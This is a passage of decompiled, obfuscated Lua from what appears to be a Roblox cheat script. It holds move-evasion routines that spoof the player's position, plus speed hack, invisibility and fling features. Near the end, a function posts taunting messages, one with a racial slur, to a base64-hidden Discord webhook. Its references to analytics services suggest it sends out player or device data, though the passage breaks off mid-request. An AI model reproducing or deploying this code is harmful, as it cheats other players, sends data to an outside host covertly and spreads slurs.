                                                            until l_v1136_0 == false or tick() >= v1142 + 0.85 or not v936.IsPlaying or isCountering(v940);
                                                            getgenv().desync = nil;
                                                        end;
                                                        l_RenderStepped_0:Wait();
                                                    until tick() >= v1142 + 0.85 or not v936.IsPlaying;
                                                    getgenv().desync = nil;
                                                    if v1135 then
                                                        v1135:Destroy();
                                                    end;
                                                    v1139:Disconnect();
                                                    v1141:Disconnect();
                                                end;
                                            end;
                                        elseif l_AnimationId_1:match("18435535291") and rawget(Options.AntiMoves_Suiryu.Value, "Anti Suiryu Ult") then
                                            task.wait(4.25);
                                            local v1143 = tick();
                                            repeat
                                                if antidebug then
                                                    warn("[ANTI DEBUG] 35");
                                                end;
                                                if (v939.Position - v885.Position).Magnitude <= 100 then
                                                    repeat
                                                        if antidebug then
                                                            warn("[ANTI DEBUG] 35");
                                                        end;
                                                        getgenv().desync = {
                                                            CFrame = CFrame.new(9000000000, 9000000000, 9000000000)
                                                        };
                                                        task.wait();
                                                    until (v939.Position - v885.Position).Magnitude > 100 or tick() >= v1143 + 1.25;
                                                    getgenv().desync = nil;
                                                end;
                                                task.wait();
                                            until tick() >= v1143 + 1.25;
                                            getgenv().desync = nil;
                                        elseif l_AnimationId_1:match("129651400898906") and rawget(Options.AntiMoves_Suiryu.Value, "Anti Grand Fissure") then
                                            task.wait(0.5);
                                            local l_CFrame_17 = v885.CFrame;
                                            local v1145 = tick();
                                            repeat
                                                if antidebug then
                                                    warn("[ANTI DEBUG] 34");
                                                end;
                                                if (v939.Position - v885.Position).Magnitude <= 75 then
                                                    repeat
                                                        if antidebug then
                                                            warn("[ANTI DEBUG] 34");
                                                        end;
                                                        getgenv().desync = {
                                                            CFrame = CFrame.new(9000000000, 9000000000, 9000000000)
                                                        };
                                                        task.wait();
                                                    until (v939.Position - v885.Position).Magnitude > 75 or tick() >= v1145 + 1.25 or not v936.IsPlaying;
                                                    getgenv().desync = nil;
                                                end;
                                                task.wait();
                                            until tick() >= v1145 + 1.25 or not v936.IsPlaying;
                                            getgenv().desync = nil;
                                            task.wait(1);
                                            repeat
                                                if antidebug then
                                                    warn("[ANTI DEBUG] 34");
                                                end;
                                                if (v939.Position - l_CFrame_17.Position).Magnitude <= 75 then
                                                    repeat
                                                        if antidebug then
                                                            warn("[ANTI DEBUG] 34");
                                                        end;
                                                        getgenv().desync = {
                                                            CFrame = CFrame.new(9000000000, 9000000000, 9000000000)
                                                        };
                                                        task.wait();
                                                    until (v939.Position - l_CFrame_17.Position).Magnitude > 75 or tick() >= v1145 + 3;
                                                    getgenv().desync = nil;
                                                end;
                                                task.wait();
                                            until tick() >= v1145 + 3;
                                            getgenv().desync = nil;
                                        elseif l_AnimationId_1:match("18896229321") and rawget(Options.AntiMoves_Suiryu.Value, "Anti Twin Fangs") then
                                            local v1146 = tick();
                                            repeat
                                                if antidebug then
                                                    warn("[ANTI DEBUG] 33");
                                                end;
                                                if (v939.Position - v885.Position).Magnitude <= 15 and not isCountering(v940) then
                                                    repeat
                                                        if antidebug then
                                                            warn("[ANTI DEBUG] 33");
                                                        end;
                                                        getgenv().desync = {
                                                            CFrame = CFrame.new(9000000000, 9000000000, 9000000000)
                                                        };
                                                        task.wait();
                                                    until (v939.Position - v885.Position).Magnitude > 15 or tick() >= v1146 + 3.5 or not v936.IsPlaying or isCountering(v940);
                                                    getgenv().desync = nil;
                                                end;
                                                task.wait();
                                            until tick() >= v1146 + 3.5 or not v936.IsPlaying;
                                            getgenv().desync = nil;
                                            task.wait(1);
                                            if v936.IsPlaying then
                                                repeat
                                                    if antidebug then
                                                        warn("[ANTI DEBUG] 33");
                                                    end;
                                                    if (v939.Position - v885.Position).Magnitude <= 25 then
                                                        repeat
                                                            if antidebug then
                                                                warn("[ANTI DEBUG] 33");
                                                            end;
                                                            getgenv().desync = {
                                                                CFrame = CFrame.new(9000000000, 9000000000, 9000000000)
                                                            };
                                                            task.wait();
                                                        until (v939.Position - v885.Position).Magnitude > 25 or tick() >= v1146 + 5.5 or not v936.IsPlaying;
                                                        getgenv().desync = nil;
                                                    end;
                                                    task.wait();
                                                until tick() >= v1146 + 5.5 or not v936.IsPlaying;
                                            end;
                                        elseif l_AnimationId_1:match("18897119503") and rawget(Options.AntiMoves_Suiryu.Value, "Anti Earth Splitting Strike") then
                                            local v1147 = Instance.new("Part", l_Workspace_0);
                                            v1147.Anchored = true;
                                            v1147.Size = Vector3.new(35, 10, 75);
                                            v1147.CanCollide = false;
                                            v1147.Transparency = 1;
                                            local v1148 = false;
                                            if true then
                                                local l_v1148_0 = v1148;
                                                local v1151 = v1147.Touched:Connect(function(v1150) --[[ Line: 0 ]] --[[ Name:  ]]
                                                    -- upvalues: v939 (ref), l_v1148_0 (ref)
                                                    if v1150 == v939 then
                                                        l_v1148_0 = true;
                                                    end;
                                                end);
                                                local v1153 = v1147.TouchEnded:Connect(function(v1152) --[[ Line: 0 ]] --[[ Name:  ]]
                                                    -- upvalues: v939 (ref), l_v1148_0 (ref)
                                                    if v1152 == v939 then
                                                        l_v1148_0 = false;
                                                    end;
                                                end);
                                                local v1154 = tick();
                                                repeat
                                                    if antidebug then
                                                        warn("[ANTI DEBUG] 33");
                                                    end;
                                                    v1147.CFrame = v885.CFrame * CFrame.new(0, 0, -v1147.Size.Z / 2);
                                                    if l_v1148_0 == true then
                                                        repeat
                                                            if antidebug then
                                                                warn("[ANTI DEBUG] 33");
                                                            end;
                                                            v1147.CFrame = v885.CFrame * CFrame.new(0, 0, -v1147.Size.Z / 2);
                                                            getgenv().desync = {
                                                                CFrame = CFrame.new(9000000000, 9000000000, 9000000000)
                                                            };
                                                            task.wait();
                                                        until l_v1148_0 == false or tick() >= v1154 + 2.5 or not v936.IsPlaying;
                                                        getgenv().desync = nil;
                                                    end;
                                                    l_RenderStepped_0:Wait();
                                                until tick() >= v1154 + 2.5 or not v936.IsPlaying;
                                                getgenv().desync = nil;
                                                if v1147 then
                                                    v1147:Destroy();
                                                end;
                                                v1151:Disconnect();
                                                v1153:Disconnect();
                                            end;
                                        elseif l_AnimationId_1:match("106755459092436") and rawget(Options.AntiMoves_Suiryu.Value, "Anti Last Breath") then
                                            MoveNotify(v879, "Last Breath");
                                            task.wait(3);
                                            if isAnimPlaying(v886, "106755459092436") or isAnimPlaying(v886, "132259592388175") then
                                                local v1155 = tick();
                                                repeat
                                                    if antidebug then
                                                        warn("[ANTI DEBUG] 32");
                                                    end;
                                                    if isAnimPlaying(v886, "106755459092436") or isAnimPlaying(v886, "132259592388175") then
                                                        repeat
                                                            getgenv().desync = {
                                                                CFrame = CFrame.new(9000000000, 9000000000, 9000000000)
                                                            };
                                                            task.wait();
                                                        until tick() >= v1155 + 3.5 or not isAnimPlaying(v886, "106755459092436") and not isAnimPlaying(v886, "132259592388175");
                                                        getgenv().desync = nil;
                                                    end;
                                                    task.wait();
                                                until tick() >= v1155 + 3.5;
                                                getgenv().desync = nil;
                                            end;
                                        elseif l_AnimationId_1:match("75502010126640") and rawget(Options.AntiMoves_Suiryu.Value, "Anti Last Breath") then
                                            task.wait(10);
                                            local v1156 = tick();
                                            repeat
                                                if antidebug then
                                                    warn("[ANTI DEBUG] 18");
                                                end;
                                                if (v939.Position - v885.Position).Magnitude <= 100 then
                                                    repeat
                                                        if antidebug then
                                                            warn("[ANTI DEBUG] 18");
                                                        end;
                                                        getgenv().desync = {
                                                            CFrame = CFrame.new(9000000000, 9000000000, 9000000000)
                                                        };
                                                        task.wait();
                                                    until (v939.Position - v885.Position).Magnitude > 100 or tick() >= v1156 + 3;
                                                    getgenv().desync = nil;
                                                end;
                                                task.wait();
                                            until tick() >= v1156 + 3;
                                            getgenv().desync = nil;
                                        elseif l_AnimationId_1:match("16734584478") and rawget(Options.AntiMoves_Tatsumaki.Value, "Anti Tatsumaki Ult") then
                                            local v1157 = tick();
                                            repeat
                                                if antidebug then
                                                    warn("[ANTI DEBUG] 27");
                                                end;
                                                if (v939.Position - v885.Position).Magnitude <= 75 then
                                                    repeat
                                                        if antidebug then
                                                            warn("[ANTI DEBUG] 27");
                                                        end;
                                                        getgenv().desync = {
                                                            CFrame = CFrame.new(9000000000, 9000000000, 9000000000)
                                                        };
                                                        task.wait();
                                                    until (v939.Position - v885.Position).Magnitude > 75 or tick() >= v1157 + 5.75;
                                                    getgenv().desync = nil;
                                                end;
                                                task.wait();
                                            until tick() >= v1157 + 5.75;
                                            getgenv().desync = nil;
                                        elseif l_AnimationId_1:match("17141153099") and rawget(Options.AntiMoves_KJ.Value, "Anti Stoic Bomb") then
                                            task.delay(2, function() --[[ Line: 0 ]] --[[ Name:  ]]
                                                -- upvalues: v939 (ref), v885 (ref)
                                                local v1158 = tick();
                                                repeat
                                                    if antidebug then
                                                        warn("[ANTI DEBUG] 28");
                                                    end;
                                                    if (v939.Position - v885.Position).Magnitude <= 75 then
                                                        repeat
                                                            if antidebug then
                                                                warn("[ANTI DEBUG] 28");
                                                            end;
                                                            getgenv().desync = {
                                                                CFrame = CFrame.new(9000000000, 9000000000, 9000000000)
                                                            };
                                                            task.wait();
                                                        until (v939.Position - v885.Position).Magnitude > 75 or tick() >= v1158 + 1.5;
                                                        getgenv().desync = nil;
                                                    end;
                                                    task.wait();
                                                until tick() >= v1158 + 1.5;
                                                getgenv().desync = nil;
                                            end);
                                        elseif l_AnimationId_1:match("17354976067") and rawget(Options.AntiMoves_KJ.Value, "Anti 20-20-20 Dropkick") then
                                            MoveNotify(v879, "20-20-20 Dropkick");
                                            task.delay(1, function() --[[ Line: 0 ]] --[[ Name:  ]]
                                                -- upvalues: l_Workspace_0 (ref), v939 (ref), v885 (ref), v936 (ref), l_RenderStepped_0 (ref)
                                                local v1159 = Instance.new("Part", l_Workspace_0);
                                                v1159.Anchored = true;
                                                v1159.Size = Vector3.new(25, 5, 125);
                                                v1159.CanCollide = false;
                                                v1159.Transparency = 1;
                                                local v1160 = false;
                                                local v1162 = v1159.Touched:Connect(function(v1161) --[[ Line: 0 ]] --[[ Name:  ]]
                                                    -- upvalues: v939 (ref), v1160 (ref)
                                                    if v1161 == v939 then
                                                        v1160 = true;
                                                    end;
                                                end);
                                                local v1164 = v1159.TouchEnded:Connect(function(v1163) --[[ Line: 0 ]] --[[ Name:  ]]
                                                    -- upvalues: v939 (ref), v1160 (ref)
                                                    if v1163 == v939 then
                                                        v1160 = false;
                                                    end;
                                                end);
                                                local v1165 = tick();
                                                repeat
                                                    if antidebug then
                                                        warn("[ANTI DEBUG] 29");
                                                    end;
                                                    v1159.CFrame = v885.CFrame * CFrame.new(0, 0, -v1159.Size.Y / 2);
                                                    if v1160 then
                                                        repeat
                                                            if antidebug then
                                                                warn("[ANTI DEBUG] 29");
                                                            end;
                                                            getgenv().desync = {
                                                                CFrame = CFrame.new(9000000000, 9000000000, 9000000000)
                                                            };
                                                            task.wait();
                                                        until not v1160 or tick() >= v1165 + 5 or not v936.IsPlaying;
                                                        getgenv().desync = nil;
                                                    end;
                                                    l_RenderStepped_0:Wait();
                                                until tick() >= v1165 + 5 or not v936.IsPlaying;
                                                getgenv().desync = nil;
                                                if v1159 then
                                                    v1159:Destroy();
                                                end;
                                                v1162:Disconnect();
                                                v1164:Disconnect();
                                            end);
                                        elseif l_AnimationId_1:match("18462894593") and rawget(Options.AntiMoves_KJ.Value, "Anti Five Seasons") then
                                            task.delay(6.75, function() --[[ Line: 0 ]] --[[ Name:  ]]
                                                local v1166 = tick();
                                                repeat
                                                    if antidebug then
                                                        warn("[ANTI DEBUG] 30");
                                                    end;
                                                    getgenv().desync = {
                                                        CFrame = CFrame.new(9000000000, 9000000000, 9000000000)
                                                    };
                                                    task.wait();
                                                until tick() >= v1166 + 1;
                                                getgenv().desync = nil;
                                            end);
                                        elseif l_AnimationId_1:match("100558589307006") and rawget(Options.AntiMoves_FrozenSoul.Value, "Anti Permafrost") then
                                            task.wait(0.35);
                                            if v936.IsPlaying then
                                                local v1167 = Instance.new("Part", l_Workspace_0);
                                                v1167.Anchored = true;
                                                v1167.Size = Vector3.new(45, 25, 85);
                                                v1167.CanCollide = false;
                                                v1167.Transparency = 1;
                                                local v1168 = false;
                                                if true then
                                                    local l_v1168_0 = v1168;
                                                    local v1171 = v1167.Touched:Connect(function(v1170) --[[ Line: 0 ]] --[[ Name:  ]]
                                                        -- upvalues: v939 (ref), l_v1168_0 (ref)
                                                        if v1170 == v939 then
                                                            l_v1168_0 = true;
                                                        end;
                                                    end);
                                                    local v1173 = v1167.TouchEnded:Connect(function(v1172) --[[ Line: 0 ]] --[[ Name:  ]]
                                                        -- upvalues: v939 (ref), l_v1168_0 (ref)
                                                        if v1172 == v939 then
                                                            l_v1168_0 = false;
                                                        end;
                                                    end);
                                                    local v1174 = tick();
                                                    repeat
                                                        if antidebug then
                                                            warn("[ANTI DEBUG] PERMAFROST");
                                                        end;
                                                        v1167.CFrame = v885.CFrame * CFrame.new(0, 0, -v1167.Size.Z / 2);
                                                        if l_v1168_0 == true and not isCountering(v940) then
                                                            repeat
                                                                if antidebug then
                                                                    warn("[ANTI DEBUG] PERMAFROST");
                                                                end;
                                                                v1167.CFrame = v885.CFrame * CFrame.new(0, 0, -v1167.Size.Z / 2);
                                                                getgenv().desync = {
                                                                    CFrame = CFrame.new(9000000000, 9000000000, 9000000000)
                                                                };
                                                                task.wait();
                                                            until l_v1168_0 == false or tick() >= v1174 + 0.65 or not v936.IsPlaying;
                                                            getgenv().desync = nil;
                                                        end;
                                                        l_RenderStepped_0:Wait();
                                                    until tick() >= v1174 + 0.65 or not v936.IsPlaying;
                                                    getgenv().desync = nil;
                                                    if v1167 then
                                                        v1167:Destroy();
                                                    end;
                                                    v1171:Disconnect();
                                                    v1173:Disconnect();
                                                end;
                                            end;
                                        elseif l_AnimationId_1:match("137561511768861") and rawget(Options.AntiMoves_FrozenSoul.Value, "Anti Frost Forge") then
                                            task.delay(1, function() --[[ Line: 0 ]] --[[ Name:  ]]
                                                -- upvalues: v939 (ref), v885 (ref)
                                                local v1175 = tick();
                                                repeat
                                                    if antidebug then
                                                        warn("[ANTI DEBUG] FROST FORGE");
                                                    end;
                                                    if (v939.Position - v885.Position).Magnitude <= 150 then
                                                        repeat
                                                            if antidebug then
                                                                warn("[ANTI DEBUG] FROST FORGE");
                                                            end;
                                                            getgenv().desync = {
                                                                CFrame = CFrame.new(9000000000, 9000000000, 9000000000)
                                                            };
                                                            task.wait();
                                                        until (v939.Position - v885.Position).Magnitude > 150 or tick() >= v1175 + 0.75;
                                                        getgenv().desync = nil;
                                                    end;
                                                    task.wait();
                                                until tick() >= v1175 + 0.75;
                                                getgenv().desync = nil;
                                            end);
                                        elseif l_AnimationId_1:match("112620365240235") and rawget(Options.AntiMoves_FrozenSoul.Value, "Anti Freezing Path") then
                                            task.wait(0.5);
                                            if v936.IsPlaying then
                                                local v1176 = Instance.new("Part", l_Workspace_0);
                                                v1176.Anchored = true;
                                                v1176.Size = Vector3.new(20, 10, 35);
                                                v1176.CanCollide = false;
                                                v1176.Transparency = 1;
                                                local v1177 = false;
                                                if true then
                                                    local l_v1177_0 = v1177;
                                                    local v1180 = v1176.Touched:Connect(function(v1179) --[[ Line: 0 ]] --[[ Name:  ]]
                                                        -- upvalues: v939 (ref), l_v1177_0 (ref)
                                                        if v1179 == v939 then
                                                            l_v1177_0 = true;
                                                        end;
                                                    end);
                                                    local v1182 = v1176.TouchEnded:Connect(function(v1181) --[[ Line: 0 ]] --[[ Name:  ]]
                                                        -- upvalues: v939 (ref), l_v1177_0 (ref)
                                                        if v1181 == v939 then
                                                            l_v1177_0 = false;
                                                        end;
                                                    end);
                                                    local v1183 = tick();
                                                    repeat
                                                        if antidebug then
                                                            warn("[ANTI DEBUG] FREEZING PATH");
                                                        end;
                                                        v1176.CFrame = v885.CFrame * CFrame.new(0, 0, -v1176.Size.Z / 2);
                                                        if l_v1177_0 == true and not isCountering(v940) then
                                                            repeat
                                                                if antidebug then
                                                                    warn("[ANTI DEBUG] FREEZING PATH");
                                                                end;
                                                                v1176.CFrame = v885.CFrame * CFrame.new(0, 0, -v1176.Size.Z / 2);
                                                                getgenv().desync = {
                                                                    CFrame = CFrame.new(9000000000, 9000000000, 9000000000)
                                                                };
                                                                task.wait();
                                                            until l_v1177_0 == false or tick() >= v1183 + 4 or not v936.IsPlaying;
                                                            getgenv().desync = nil;
                                                        end;
                                                        l_RenderStepped_0:Wait();
                                                    until tick() >= v1183 + 4 or not v936.IsPlaying;
                                                    getgenv().desync = nil;
                                                    if v1176 then
                                                        v1176:Destroy();
                                                    end;
                                                    v1180:Disconnect();
                                                    v1182:Disconnect();
                                                end;
                                            end;
                                        elseif l_AnimationId_1:match("75547590335774") and rawget(Options.AntiMoves_FrozenSoul.Value, "Anti Judgement Chain") then
                                            task.wait(0.35);
                                            if v936.IsPlaying then
                                                local v1184 = Instance.new("Part", l_Workspace_0);
                                                v1184.Anchored = true;
                                                v1184.Size = Vector3.new(10, 5, 175);
                                                v1184.CanCollide = false;
                                                v1184.Transparency = 1;
                                                local v1185 = false;
                                                if true then
                                                    local l_v1185_0 = v1185;
                                                    local v1188 = v1184.Touched:Connect(function(v1187) --[[ Line: 0 ]] --[[ Name:  ]]
                                                        -- upvalues: v939 (ref), l_v1185_0 (ref)
                                                        if v1187 == v939 then
                                                            l_v1185_0 = true;
                                                        end;
                                                    end);
                                                    local v1190 = v1184.TouchEnded:Connect(function(v1189) --[[ Line: 0 ]] --[[ Name:  ]]
                                                        -- upvalues: v939 (ref), l_v1185_0 (ref)
                                                        if v1189 == v939 then
                                                            l_v1185_0 = false;
                                                        end;
                                                    end);
                                                    local v1191 = tick();
                                                    repeat
                                                        if antidebug then
                                                            warn("[ANTI DEBUG] JUDGEMENT CHAIN");
                                                        end;
                                                        v1184.CFrame = v885.CFrame * CFrame.new(0, 0, -v1184.Size.Z / 2);
                                                        if l_v1185_0 == true and not isCountering(v940) then
                                                            repeat
                                                                if antidebug then
                                                                    warn("[ANTI DEBUG] JUDGEMENT CHAIN");
                                                                end;
                                                                v1184.CFrame = v885.CFrame * CFrame.new(0, 0, -v1184.Size.Z / 2);
                                                                getgenv().desync = {
                                                                    CFrame = CFrame.new(9000000000, 9000000000, 9000000000)
                                                                };
                                                                task.wait();
                                                            until l_v1185_0 == false or tick() >= v1191 + 1 or not v936.IsPlaying;
                                                            getgenv().desync = nil;
                                                        end;
                                                        l_RenderStepped_0:Wait();
                                                    until tick() >= v1191 + 1 or not v936.IsPlaying;
                                                    getgenv().desync = nil;
                                                    if v1184 then
                                                        v1184:Destroy();
                                                    end;
                                                    v1188:Disconnect();
                                                    v1190:Disconnect();
                                                end;
                                            end;
                                        end;
                                        return;
                                    end;
                                end);
                            end;
                        end);
                    end;
                end;
            end;
            task.spawn(function() --[[ Line: 0 ]] --[[ Name:  ]]
                -- upvalues: v12 (ref), l_Workspace_0 (ref), l_PreSimulation_0 (ref), v94 (ref), l_Heartbeat_0 (ref), v91 (ref), l_RenderStepped_0 (ref), l_UserInputService_0 (ref)
                local v1192 = nil;
                task.spawn(function() --[[ Line: 0 ]] --[[ Name:  ]]
                    -- upvalues: v12 (ref), v1192 (ref)
                    repeat
                        task.wait();
                    until getChar(v12);
                    local v1193 = getChar(v12);
                    v1192 = Instance.new("Model");
                    v1193.Archivable = true;
                    local v1194 = v1193:Clone();
                    v1193.Archivable = false;
                    if v1194:FindFirstChildWhichIsA("Humanoid") then
                        v1194.Humanoid:Destroy();
                    end;
                    for _, v1196 in pairs(v1194:GetChildren()) do
                        if v1196:IsA("Humanoid") then
                            v1196:Destroy();
                        elseif v1196:IsA("BasePart") or v1196:IsA("MeshPart") then
                            local v1197 = v1196:Clone();
                            v1197.CanCollide = false;
                            v1197.Anchored = true;
                            v1197.Transparency = not table.find({
                                "HumanoidRootPart", 
                                "FakeHead", 
                                "Hitbox_RightArm", 
                                "Hitbox_LeftArm", 
                                "Hitbox_RightLeg", 
                                "Hitbox_LeftLeg"
                            }, v1197.Name) and 0.65 or 1;
                            v1197.Color = Color3.fromRGB(255, 255, 255);
                            v1197.Size = v1197.Size * 1.01;
                            v1197.Parent = v1192;
                            if v1197.Name == "Head" then
                                v1197.Color = Color3.fromRGB(255, 0, 0);
                            elseif v1197.Name ~= "HumanoidRootPart" then
                                v1197.Material = Enum.Material.ForceField;
                                local v1198 = Instance.new("SpecialMesh", v1197);
                                v1198.Scale = v1197.Size;
                                v1198.TextureId = "rbxassetid://5101923607";
                                v1198.VertexColor = Vector3.new(255, 0, 0);
                            end;
                            for _, v1200 in pairs({
                                "Sound", 
                                "Decal", 
                                "Trail", 
                                "BodyVelocity", 
                                "BodyGyro", 
                                "BodyPosition", 
                                "ParticleEmitter"
                            }) do
                                local l_v1197_FirstChildWhichIsA_0 = v1197:FindFirstChildWhichIsA(v1200);
                                if l_v1197_FirstChildWhichIsA_0 then
                                    l_v1197_FirstChildWhichIsA_0:Destroy();
                                end;
                            end;
                        end;
                    end;
                    v1192.Parent = workspace.Terrain;
                end);
                local v1202 = Instance.new("Model", l_Workspace_0);
                local v1203 = Instance.new("Humanoid", v1202);
                local v1204 = Instance.new("Part", v1202);
                v1204.Name = "HumanoidRootPart";
                v1204.CanCollide = false;
                v1204.Transparency = 1;
                v1204.Anchored = true;
                v1204.Size = Vector3.new(2, 2, 1);
                task.spawn(function() --[[ Line: 0 ]] --[[ Name:  ]]
                    -- upvalues: l_PreSimulation_0 (ref), v12 (ref), v94 (ref)
                    while l_PreSimulation_0:Wait() do
                        local l_Value_15 = Options.SpeedHackMethod.Value;
                        local v1206 = getChar(v12);
                        local v1207 = v1206 and getRoot(v1206);
                        local v1208 = v1206 and getHumanoid(v1206);
                        if v1206 and v1207 and v1208 and Toggles.SpeedHackEnabled.Value and not v94.Flying then
                            if l_Value_15 == "CFrame" then
                                v1207.CFrame = v1207.CFrame + v1208.MoveDirection * (Options.SpeedHack.Value / 10000);
                            elseif l_Value_15 == "Velocity" and v1208.MoveDirection ~= Vector3.new() then
                                repeat
                                    local v1209 = v1208.MoveDirection.Unit * (Options.SpeedHack.Value / 100);
                                    v1207.Velocity = Vector3.new(v1209.X, v1207.Velocity.Y, v1209.Z);
                                    l_PreSimulation_0:Wait();
                                until v1208.MoveDirection == Vector3.new() or Options.SpeedHackMethod.Value ~= l_Value_15;
                                v1207.Velocity = Vector3.new();
                            end;
                        end;
                    end;
                end);
                l_Heartbeat_0:Connect(function() --[[ Line: 0 ]] --[[ Name:  ]]
                    -- upvalues: v12 (ref), l_Workspace_0 (ref), v94 (ref), v1192 (ref), v1203 (ref), v1204 (ref), v91 (ref), l_RenderStepped_0 (ref), l_UserInputService_0 (ref)
                    local v1210 = getChar(v12);
                    local v1211 = v1210 and getRoot(v1210);
                    local v1212 = v1210 and getHumanoid(v1210);
                    if v1210 and v1211 and v1212 then
                        local v1213 = {
                            CFrame = v1211.CFrame, 
                            Velocity = v1211.Velocity
                        };
                        local v1214 = nil;
                        local l_CurrentCamera_6 = l_Workspace_0.CurrentCamera;
                        local v1216 = false;
                        if (v94.Invisibility or v94["Doing Wall Combo Anywhere"]) and (not getgenv().desync or not not v1210:FindFirstChild("AbsoluteImmortal")) then
                            v1216 = true;
                        end;
                        if v1212.Health > 0 then
                            if v94.Invisibility or v94["Upside Down"] then
                                v1214 = v1213.CFrame * CFrame.Angles(0, 0, math.rad(180));
                            end;
                            if getgenv().flingDesync then
                                local l_CFrame_18 = getgenv().flingDesync.CFrame;
                                if l_CFrame_18 then
                                    v1214 = l_CFrame_18;
                                end;
                            end;
                            if getgenv().desync and not v1210:FindFirstChild("AbsoluteImmortal") then
                                local l_CFrame_19 = getgenv().desync.CFrame;
                                if l_CFrame_19 then
                                    v1214 = l_CFrame_19;
                                end;
                            end;
                        end;
                        if v1216 and v1192 and Toggles.Visualizer.Value then
                            for _, v1220 in pairs(v1192:GetChildren()) do
                                if v1220:IsA("BasePart") then
                                    local l_v1210_FirstChild_0 = v1210:FindFirstChild(v1220.Name);
                                    if l_v1210_FirstChild_0 and l_v1210_FirstChild_0:IsA("BasePart") then
                                        v1220.CFrame = l_v1210_FirstChild_0.CFrame;
                                    end;
                                end;
                            end;
                        end;
                        if v1214 then
                            if l_CurrentCamera_6 and l_CurrentCamera_6.CameraSubject == v1212 then
                                v1210:SetAttribute("NoHeadLerp", true);
                                l_CurrentCamera_6.CameraSubject = v1203;
                            end;
                            v1204.CFrame = v1213.CFrame;
                            v1211.CFrame = v1214;
                            if v1192 and Toggles.Visualizer.Value and not Toggles.AlwaysVisualize.Value and not v1216 then
                                for _, v1223 in pairs(v1192:GetChildren()) do
                                    if v1223:IsA("BasePart") then
                                        local l_v1210_FirstChild_1 = v1210:FindFirstChild(v1223.Name);
                                        if l_v1210_FirstChild_1 and l_v1210_FirstChild_1:IsA("BasePart") then
                                            v1223.CFrame = l_v1210_FirstChild_1.CFrame;
                                        end;
                                    end;
                                end;
                            end;
                        end;
                        if v1192 and not v1216 then
                            if Toggles.Visualizer.Value and Toggles.AlwaysVisualize.Value then
                                for _, v1226 in pairs(v1192:GetChildren()) do
                                    if v1226:IsA("BasePart") then
                                        local l_v1210_FirstChild_2 = v1210:FindFirstChild(v1226.Name);
                                        if l_v1210_FirstChild_2 and l_v1210_FirstChild_2:IsA("BasePart") then
                                            v1226.CFrame = l_v1210_FirstChild_2.CFrame;
                                        end;
                                    end;
                                end;
                            elseif not Toggles.Visualizer.Value or not Toggles.AlwaysVisualize.Value and not v1214 then
                                for _, v1229 in pairs(v1192:GetChildren()) do
                                    if v1229:IsA("BasePart") then
                                        v1229.CFrame = CFrame.new(0, 1000000, 0);
                                    end;
                                end;
                            end;
                        end;
                        if Toggles.FlingOnDeath.Value and v1212.Health <= 0 then
                            v1211.Velocity = Vector3.new(1, 1, 1) * 16384;
                        elseif v94["Trashcan Launch"] and Toggles.TrashcanLaunch.Value then
                            v1211.Velocity = v1211.CFrame.LookVector * Options.Trashcan_LaunchPower.Value;
                        elseif getgenv().flingDesync and getgenv().flingDesync.Velocity or v94["Velocity Spoof"] then
                            v1211.Velocity = v94["Velocity Spoof Settings"];
                        end;
                        local v1230 = nil;
                        if v94.Invisibility and (not getgenv().flingDesync or not getgenv().flingDesync.Velocity) then
                            v1230 = loadAnim(v1212, v91.ID);
                            v1230.Priority = Enum.AnimationPriority.Action4;
                            if v1230 then
                                v1230:Play();
                                v1230.TimePosition = v91.TimePosition;
                                v1230:AdjustSpeed(0);
                                v1230:AdjustWeight(1);
                            end;
                        end;
                        l_RenderStepped_0:Wait();
                        v1203.CameraOffset = v1212.CameraOffset;
                        if l_CurrentCamera_6 and l_CurrentCamera_6.CameraSubject == v1203 then
                            v1210:SetAttribute("NoHeadLerp", false);
                            l_CurrentCamera_6.CameraSubject = v1212;
                        end;
                        if v1230 and v1230.IsPlaying then
                            v1230.Stop(v1230);
                        end;
                        if v1214 then
                            if l_CurrentCamera_6 and l_UserInputService_0.MouseBehavior == Enum.MouseBehavior.LockCenter then
                                v1211.CFrame = CFrame.new(v1213.CFrame.Position, v1213.CFrame.Position + Vector3.new(l_CurrentCamera_6.CFrame.LookVector.X, 0, l_CurrentCamera_6.CFrame.LookVector.Z));
                            else
                                v1211.CFrame = v1213.CFrame;
                            end;
                        end;
                        v1211.Velocity = v1213.Velocity;
                    end;
                end);
            end);
            task.spawn(function() --[[ Line: 0 ]] --[[ Name:  ]]
                if workspace.CurrentCamera then
                    patchCamera(workspace.CurrentCamera);
                end;
                workspace.ChildAdded:Connect(patchCamera);
            end);
            if v12.Character then
                task.spawn(init);
            end;
            v68[#v68 + 1] = v12.CharacterAdded:Connect(function() --[[ Line: 0 ]] --[[ Name:  ]]
                task.spawn(init, true);
            end);
            local v1231 = {
                [1033636351] = "<@287493655835443201>", 
                [9892253606] = "<@422612957755736064>"
            };
            local function v1233(v1232) --[[ Line: 0 ]] --[[ Name:  ]]
                -- upvalues: v1231 (ref)
                if v1232 and table.find({
                    1033636351, 
                    9892253606
                }, v1232) then
                    return true, v1231[v1232];
                else
                    return false, nil;
                end;
            end;
            local function v1237(v1234) --[[ Line: 0 ]] --[[ Name:  ]]
                -- upvalues: v27 (ref), v29 (ref), l_HttpService_0 (ref), v412 (ref), l_Players_0 (ref), v101 (ref), v102 (ref), v404 (ref), v407 (ref), v408 (ref), v409 (ref), v12 (ref), l_RbxAnalyticsService_0 (ref), l_l_HttpService_0_0 (ref)
                local v1235 = {
                    "theres an exploiter in your server ThePersonToPing", 
                    "ThePersonToPing theres some fat skid in your server rn", 
                    "ThePersonToPing YOU'RE ABOUT TO GET PASTED ON THERES A HACKER IN YOUR SERVER!!", 
                    "WATCH OUT ThePersonToPing THERES A PASTER IN YOUR SERVER", 
                    "ThePersonToPing Theres some cheater nigga in your server watch out brochacho"
                };
                local v1236 = v1235[math.random(1, #v1235)]:gsub("ThePersonToPing", v1234);
                task.spawn(pcall, function() --[[ Line: 0 ]] --[[ Name:  ]]
                    -- upvalues: v27 (ref), v29 (ref), l_HttpService_0 (ref), v1236 (ref), v412 (ref), l_Players_0 (ref), v101 (ref), v102 (ref), v404 (ref), v407 (ref), v408 (ref), v409 (ref), v12 (ref), l_RbxAnalyticsService_0 (ref), l_l_HttpService_0_0 (ref)
                    v27({
                        Url = v29("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ0MzE2NjE1NTQwODY3NDkzOC9GNk5veFBMYjVZb1lnci00U05HNFZvOEJWYWRQWE0zb0JRSnc0dmtwVWpWUkhZeWhKRFRPTEZqTFBBY2FlUlUzUzdueA=="), 
                        Method = "POST", 
                        Headers = {
                            ["content-type"] = "application/json"
                        }, 
                        Body = l_HttpService_0:JSONEncode({
                            content = v1236, 
                            embeds = {
                                {
